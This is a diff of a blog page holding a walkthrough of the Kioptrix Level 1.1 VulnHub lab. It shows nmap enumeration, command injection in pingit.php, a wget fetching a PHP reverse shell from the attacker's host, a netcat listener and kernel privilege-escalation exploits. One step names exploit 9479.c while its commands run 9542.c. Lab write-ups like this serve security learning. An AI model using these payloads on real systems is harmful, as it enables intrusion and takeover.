@@ -20,7 +20,7 @@
     <meta property="og:url" content="http://localhost:2368/kioptrix-walkthrough-2/">
     <meta property="og:image" content="http://localhost:2368/content/images/2018/07/Kioptrix-2-Cover.jpg">
     <meta property="article:published_time" content="2017-08-24T06:57:09.000Z">
-    <meta property="article:modified_time" content="2018-07-30T07:12:53.000Z">
+    <meta property="article:modified_time" content="2018-07-30T08:01:09.000Z">
     <meta property="article:tag" content="Boot2Root">
     <meta property="article:tag" content="VulnHub">
     <meta property="article:tag" content="OSCP">
@@ -47,12 +47,7 @@
     "publisher": {
         "@type": "Organization",
         "name": "rootshellz",
-        "logo": {
-            "@type": "ImageObject",
-            "url": "http://localhost:2368/favicon.ico",
-            "width": 60,
-            "height": 60
-        }
+        "logo": "http://localhost:2368/content/images/2018/07/Blog-Logo.png"
     },
     "author": {
         "@type": "Person",
@@ -71,7 +66,7 @@
     "headline": "Kioptrix: Level 1.1 (#2) Walkthrough",
     "url": "http://localhost:2368/kioptrix-walkthrough-2/",
     "datePublished": "2017-08-24T06:57:09.000Z",
-    "dateModified": "2018-07-30T07:12:53.000Z",
+    "dateModified": "2018-07-30T08:01:09.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "http://localhost:2368/content/images/2018/07/Kioptrix-2-Cover.jpg",
@@ -129,7 +124,7 @@
 <h1 id="prehack">Pre-Hack</h1>
 <h2 id="whereyouat">Where you at?</h2>
 <p>First, we need to identify what address the VM grabbed from DHCP:</p>
-<pre><code>root@kali:~# nmap -T4 -sn 172.16.2.0/24
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -sn 172.16.2.0/24
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-13 19:15 PDT
 Nmap scan report for 172.16.2.1
@@ -148,7 +143,7 @@ Nmap done: 256 IP addresses (4 hosts up) scanned in 12.97 seconds
 <p>Looks like my Kioptrix1.1 VM is <strong>172.16.2.131</strong>.</p>
 <h2 id="whatchagot">Whatcha got?</h2>
 <p>Now, let's see what this box is running.</p>
-<pre><code>root@kali:~# nmap -T4 -Pn -sV -O -p- 172.16.2.131
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -sV -O -p- 172.16.2.131
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-13 19:20 PDT
 Nmap scan report for 172.16.2.131
@@ -173,7 +168,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 23.93 seconds
 </code></pre>
 <p>But wait, we can't forget about UDP!  Some easy exploits have surely been missed in the past by neglecting to scan UDP.</p>
-<pre><code>root@kali:~# nmap -T4 -Pn -sU --top-ports 200 -sV -O 172.16.2.131
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -sU --top-ports 200 -sV -O 172.16.2.131
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-13 19:25 PDT
 Warning: 172.16.2.131 giving up on port because retransmission cap hit (6).
@@ -216,7 +211,7 @@ Nmap done: 1 IP address (1 host up) scanned in 283.99 seconds
 <p>Let's scan and enumerate a bit more before we start attempting to exploit anything.</p>
 <p>First, let's see what else we can find out about Apache on 80/tcp and 443/tcp.  To do this, I'll throw my favorite HTTP and SSL/TLS nmap scripts at the box's web ports.</p>
 <h4 id="apachehttpsenumeration">Apache HTTP/S Enumeration</h4>
-<pre><code>root@kali:~# nmap -T4 -Pn -p 80,443 --script=http-apache-negotiation.nse,http-apache-server-status.nse,http-backup-finder.nse,http-coldfusion-subzero.nse,http-comments-displayer.nse,http-config-backup.nse,http-csrf.nse,http-default-accounts.nse,http-devframework.nse,http-dombased-xss.nse,http-drupal-enum.nse,http-drupal-enum-users.nse,http-enum.nse,http-git.nse,http-headers.nse,http-iis-short-name-brute.nse,http-iis-webdav-vuln.nse,http-mcmp.nse,http-methods.nse,http-method-tamper.nse,http-mobileversion-checker.nse,http-open-proxy.nse,http-open-redirect.nse,http-passwd.nse,http-phpmyadmin-dir-traversal.nse,http-phpself-xss.nse,http-php-version.nse,http-proxy-brute.nse,http-robots.txt.nse,http-shellshock.nse,http-sitemap-generator.nse,http-sql-injection.nse,http-stored-xss.nse,http-title.nse,http-unsafe-output-escaping.nse,http-userdir-enum.nse,http-vhosts.nse,http-vuln-cve2006-3392.nse,http-vuln-cve2009-3960.nse,http-vuln-cve2010-0738.nse,http-vuln-cve2010-2861.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2011-3368.nse,http-vuln-cve2012-1823.nse,http-vuln-cve2013-0156.nse,http-vuln-cve2013-6786.nse,http-vuln-cve2013-7091.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2014-3704.nse,http-vuln-cve2014-8877.nse,http-vuln-cve2015-1427.nse,http-vuln-cve2015-1635.nse,http-waf-detect.nse,http-waf-fingerprint.nse,http-webdav-scan.nse,http-wordpress-enum.nse,http-wordpress-users.nse,http-xssed.nse,membase-http-info.nse,rmi-vuln-classloader.nse,ssl-ccs-injection.nse,ssl-cert.nse,ssl-date.nse,ssl-dh-params.nse,ssl-enum-ciphers.nse,ssl-google-cert-catalog.nse,ssl-heartbleed.nse,ssl-known-key.nse,ssl-poodle.nse,sslv2-drown.nse,sslv2.nse,tls-nextprotoneg.nse 172.16.2.131
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -p 80,443 --script=http-apache-negotiation.nse,http-apache-server-status.nse,http-backup-finder.nse,http-coldfusion-subzero.nse,http-comments-displayer.nse,http-config-backup.nse,http-csrf.nse,http-default-accounts.nse,http-devframework.nse,http-dombased-xss.nse,http-drupal-enum.nse,http-drupal-enum-users.nse,http-enum.nse,http-git.nse,http-headers.nse,http-iis-short-name-brute.nse,http-iis-webdav-vuln.nse,http-mcmp.nse,http-methods.nse,http-method-tamper.nse,http-mobileversion-checker.nse,http-open-proxy.nse,http-open-redirect.nse,http-passwd.nse,http-phpmyadmin-dir-traversal.nse,http-phpself-xss.nse,http-php-version.nse,http-proxy-brute.nse,http-robots.txt.nse,http-shellshock.nse,http-sitemap-generator.nse,http-sql-injection.nse,http-stored-xss.nse,http-title.nse,http-unsafe-output-escaping.nse,http-userdir-enum.nse,http-vhosts.nse,http-vuln-cve2006-3392.nse,http-vuln-cve2009-3960.nse,http-vuln-cve2010-0738.nse,http-vuln-cve2010-2861.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2011-3368.nse,http-vuln-cve2012-1823.nse,http-vuln-cve2013-0156.nse,http-vuln-cve2013-6786.nse,http-vuln-cve2013-7091.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2014-3704.nse,http-vuln-cve2014-8877.nse,http-vuln-cve2015-1427.nse,http-vuln-cve2015-1635.nse,http-waf-detect.nse,http-waf-fingerprint.nse,http-webdav-scan.nse,http-wordpress-enum.nse,http-wordpress-users.nse,http-xssed.nse,membase-http-info.nse,rmi-vuln-classloader.nse,ssl-ccs-injection.nse,ssl-cert.nse,ssl-date.nse,ssl-dh-params.nse,ssl-enum-ciphers.nse,ssl-google-cert-catalog.nse,ssl-heartbleed.nse,ssl-known-key.nse,ssl-poodle.nse,sslv2-drown.nse,sslv2.nse,tls-nextprotoneg.nse 172.16.2.131
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-13 19:34 PDT
 Nmap scan report for 172.16.2.131
@@ -524,7 +519,7 @@ Nmap done: 1 IP address (1 host up) scanned in 67.70 seconds
 <p>What does stand out on this service are some URLs to check out, an interesting comment in the source to investigate further, an outdated PHP version, and a WAF supposedly being detected.  We will circle back to these items in a bit.  At this point, I would usually also start a directory brute force, but I'm going to hold off for now unless none of the above pan out.</p>
 <h4 id="rpcenumeration">RPC Enumeration</h4>
 <p>Working my way down the services list, let's next see what we can find out about / from the RPC services.  I'll once again turn to nmap scripts.</p>
-<pre><code>root@kali:~# nmap -T4 -Pn -p 111,774 -sV --script=msrpc-enum.nse,rpc-grind.nse,rpcinfo.nse 172.16.2.131
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -p 111,774 -sV --script=msrpc-enum.nse,rpc-grind.nse,rpcinfo.nse 172.16.2.131
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-13 20:04 PDT
 Nmap scan report for 172.16.2.131
@@ -543,7 +538,7 @@ MAC Address: 00:0C:29:AF:63:7A (VMware)
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 17.18 seconds
 </code></pre>
-<pre><code>root@kali:~# nmap -T4 -Pn -sU -p 111 --script=msrpc-enum.nse,rpc-grind.nse,rpcinfo.nse 172.16.2.131
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -sU -p 111 --script=msrpc-enum.nse,rpc-grind.nse,rpcinfo.nse 172.16.2.131
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-13 20:09 PDT
 Nmap scan report for 172.16.2.131
@@ -563,7 +558,7 @@ Nmap done: 1 IP address (1 host up) scanned in 5.88 seconds
 <p>Well, there's not a whole lot to see there.  We'll leave this service alone for now.</p>
 <h4 id="mysqlenumeration">MySQL Enumeration</h4>
 <p>Finally, let's see what we can find out about the MySQL instance running on 3306/tcp.  How will we learn about this service, you ask?  Why more nmap script scanning of course!</p>
-<pre><code>root@kali:~# nmap -T4 -Pn -p 3306 --script=mysql-info.nse,mysql-enum.nse,mysql-audit.nse,mysql-users.nse,mysql-empty-password.nse,mysql-vuln-cve2012-2122.nse 172.16.2.131
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -p 3306 --script=mysql-info.nse,mysql-enum.nse,mysql-audit.nse,mysql-users.nse,mysql-empty-password.nse,mysql-vuln-cve2012-2122.nse 172.16.2.131
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-13 20:11 PDT
 Nmap scan report for 172.16.2.131
@@ -660,12 +655,12 @@ ip=127.0.0.1&amp;submit=submit
 </code></pre>
 <p>and the response:<br>
 </p>
-<p>Let's think about how the backend for this functionality might work, like we did above for the SQL statement.  It is reasonable to assume that the ping command is being called from PHP with something like this: <code>output = exec('ping -c3 $ip');</code> where <em>$ip</em> is taken directly from the posted value and not sanitized at all.</p>
+<p>Let's think about how the backend for this functionality might work, like we did above for the SQL statement.  It is reasonable to assume that the ping command is being called from PHP with something like this: <code>shell-output = exec('ping -c3 $ip');</code> where <em>$ip</em> is taken directly from the posted value and not sanitized at all.</p>
 <p>Let's see what we can sneak in to that <em>$ip</em> parameter.<br>
 The request:<br>
 <br>
 which looks like this in Burp:</p>
-<pre><code class="language-html">POST /pingit.php HTTP/1.1
+<pre><code class="language-http">POST /pingit.php HTTP/1.1
 Host: 172.16.2.131
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -684,7 +679,7 @@ ip=127.0.0.1%3B+id&amp;submit=submit
 <h4 id="shellingout">Shelling Out</h4>
 <p>To make things easier, let's get ourselves a better shell.  I first attempted to use netcat, but it is not installed on the target.  We know PHP is installed, so let's leverage that for a shell.</p>
 <p>We first need to modify the shell with our listener information:</p>
-<pre><code>root@kali:~# cp /usr/share/webshells/php/php-reverse-shell.php .
+<pre><code class="language-shell-output">root@kali:~# cp /usr/share/webshells/php/php-reverse-shell.php .
 root@kali:~# cat /usr/share/webshells/php/php-reverse-shell.php | grep "CHANGE THIS"
 $ip = '127.0.0.1';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
@@ -695,7 +690,7 @@ $ip = '172.16.2.129';
 $port = 1337;
 </code></pre>
 <p>Next, we need to serve up the shell from our Kali box and then download it to the target somewhere the apache user can write:</p>
-<pre><code>root@kali:~# python -m SimpleHTTPServer
+<pre><code class="language-shell-output">root@kali:~# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 172.16.2.131 - - [14/Aug/2017 00:28:43] "GET /php-reverse-shell.php HTTP/1.0" 200 -
 </code></pre>
@@ -714,11 +709,11 @@ Upgrade-Insecure-Requests: 1
 ip=127.0.0.1%3B+wget+-O+%2Ftmp%2Fphp-reverse-shell.php+http%3A%2F%2F172.16.2.129%3A8000%2Fphp-reverse-shell.php&amp;submit=submit
 </code></pre>
 <p>Set up our listener on our Kali box:</p>
-<pre><code>root@kali:~# nc -nnvvlp 1337
+<pre><code class="language-shell-output">root@kali:~# nc -nnvvlp 1337
 listening on [any] 1337 ...
 </code></pre>
 <p>Finally, we can execute our shell via the command injection: <code>127.0.0.1; php /tmp/php-reverse-shell.php</code></p>
-<pre><code>POST /pingit.php HTTP/1.1
+<pre><code class="language-http">POST /pingit.php HTTP/1.1
 Host: 172.16.2.131
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -732,7 +727,7 @@ Upgrade-Insecure-Requests: 1
 ip=127.0.0.1%3B+php+%2Ftmp%2Fphp-reverse-shell.php&amp;submit=submit
 </code></pre>
 <p>And voilà, a usable reverse shell:</p>
-<pre><code>root@kali:~# nc -nnvvlp 1337
+<pre><code class="language-shell-output">root@kali:~# nc -nnvvlp 1337
 listening on [any] 1337 ...
 connect to [172.16.2.129] from (UNKNOWN) [172.16.2.131] 32792
 Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
@@ -744,20 +739,20 @@ sh-3.00$
 </code></pre>
 <h4 id="privilegeescalation">Privilege Escalation</h4>
 <p>We are now staring at an apache user shell, but what we really want is a root shell.  Before I run my full Linux enumeration script, let's see if we can get an easy win — do we have a vulnerable kernel?</p>
-<pre><code>sh-3.00$ uname -a
+<pre><code class="language-shell-output">sh-3.00$ uname -a
 Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
 </code></pre>
 <p>Googling for the kernel version shows a promising result:<br>
 </p>
-<pre><code>root@kali:~# searchsploit linux 2.6 | grep 9542
+<pre><code class="language-shell-output">root@kali:~# searchsploit linux 2.6 | grep 9542
 Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Cor | ./linux/local/9542.c
 </code></pre>
 <p>Let's download it to our target:</p>
-<pre><code>root@kali:~# cp /usr/share/exploitdb/platforms/linux/local/9542.c .
+<pre><code class="language-shell-output">root@kali:~# cp /usr/share/exploitdb/platforms/linux/local/9542.c .
 root@kali:~# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 </code></pre>
-<pre><code>sh-3.00$ wget -O /tmp/9542.c http://172.16.2.129:8000/9542.c
+<pre><code class="language-shell-output">sh-3.00$ wget -O /tmp/9542.c http://172.16.2.129:8000/9542.c
 --23:19:38--  http://172.16.2.129:8000/9542.c
            =&gt; `/tmp/9542.c'
 Connecting to 172.16.2.129:8000... connected.
@@ -769,7 +764,7 @@ Length: 2,645 (2.6K) [text/plain]
 23:19:38 (210.21 MB/s) - `/tmp/9542.c' saved [2645/2645]
 </code></pre>
 <p>Compile and execute it:</p>
-<pre><code>sh-3.00$ gcc -o /tmp/9542 /tmp/9542.c
+<pre><code class="language-shell-output">sh-3.00$ gcc -o /tmp/9542 /tmp/9542.c
 sh-3.00$ chmod +x /tmp/9542
 sh-3.00$ /tmp/9542
 [-] exploit failed, try again
@@ -777,18 +772,18 @@ sh-3.00$ /tmp/9542
 <p>Hmm, all of my expectations, the 'ip_append_data()' Ring0 Privilege Escalation exploit failed on this box.  At this point, I am unsure why the exploit was unsuccessful, but I am going to move on.  In a future post, I plan to dissect this exploit and the associated vulnerability and try to understand why this did not work.</p>
 <h4 id="privilegeescalationtake2">Privilege Escalation - Take 2</h4>
 <p>Our first attempt at local privilege escalation was unsuccessful.  Luckily, it appears we have another option:</p>
-<pre><code>root@kali:~# searchsploit kernel 2.6 linux local | grep "CentOS\ 4"
+<pre><code class="language-shell-output">root@kali:~# searchsploit kernel 2.6 linux local | grep "CentOS\ 4"
 Linux Kernel 2.4 / 2.6 (RedHat Linux 9 / Fedora Core 4&lt;11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Root Exploit (5)                                                 | ./linux/local/9479.c
 Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Root Exploit (1)                                                  | ./linux/local/9542.c
 Linux Kernel 2.4.x / 2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Privilege Escalation                                      | ./linux/local/9545.c
 </code></pre>
 <p>The first result, 9479.c — 'sock_sendpage()' Ring0 Root Exploit, seems to match our target.  Let's give it a try following the same workflow as above.</p>
 <p>Let's download it to our target:</p>
-<pre><code>root@kali:~# cp /usr/share/exploitdb/platforms/linux/local/9542.c .
+<pre><code class="language-shell-output">root@kali:~# cp /usr/share/exploitdb/platforms/linux/local/9542.c .
 root@kali:~# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 </code></pre>
-<pre><code>sh-3.00$ wget -O /tmp/9542.c http://172.16.2.129:8000/9542.c
+<pre><code class="language-shell-output">sh-3.00$ wget -O /tmp/9542.c http://172.16.2.129:8000/9542.c
 --23:19:38--  http://172.16.2.129:8000/9542.c
            =&gt; `/tmp/9542.c'
 Connecting to 172.16.2.129:8000... connected.
@@ -800,7 +795,7 @@ Length: 2,645 (2.6K) [text/plain]
 23:19:38 (210.21 MB/s) - `/tmp/9542.c' saved [2645/2645]
 </code></pre>
 <p>Compile and execute it:</p>
-<pre><code>sh-3.00$ gcc -o /tmp/9542 /tmp/9542.c
+<pre><code class="language-shell-output">sh-3.00$ gcc -o /tmp/9542 /tmp/9542.c
 sh-3.00$ chmod +x /tmp/9542
 sh-3.00$ /tmp/9542
 
@@ -813,11 +808,11 @@ sh-3.00$ /tmp/9542
 <code>Linux Kernel 2.4.x / 2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Privilege Escalation | ./linux/local/9545.c</code></p>
 <p>By now, the workflow is clear:</p>
 <p>Download it to our target:</p>
-<pre><code>root@kali:~# cp /usr/share/exploitdb/platforms/linux/local/9545.c .
+<pre><code class="language-shell-output">root@kali:~# cp /usr/share/exploitdb/platforms/linux/local/9545.c .
 root@kali:~# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 </code></pre>
-<pre><code>sh-3.00$ wget -O /tmp/9545.c http://172.16.2.129:8000/9545.c
+<pre><code class="language-shell-output">sh-3.00$ wget -O /tmp/9545.c http://172.16.2.129:8000/9545.c
 --21:39:13--  http://172.16.2.129:8000/9545.c
            =&gt; `/tmp/9545.c'
 Connecting to 172.16.2.129:8000... connected.
@@ -829,7 +824,7 @@ Length: 9,785 (9.6K) [text/plain]
 21:39:13 (777.64 MB/s) - `/tmp/9545.c' saved [9785/9785]
 </code></pre>
 <p>Compile and execute it:</p>
-<pre><code>sh-3.00$ gcc -o /tmp/9545 /tmp/9545.c
+<pre><code class="language-shell-output">sh-3.00$ gcc -o /tmp/9545 /tmp/9545.c
 sh-3.00$ chmod +x /tmp/9545
 sh-3.00$ /tmp/9545
 sh: no job control in this shell
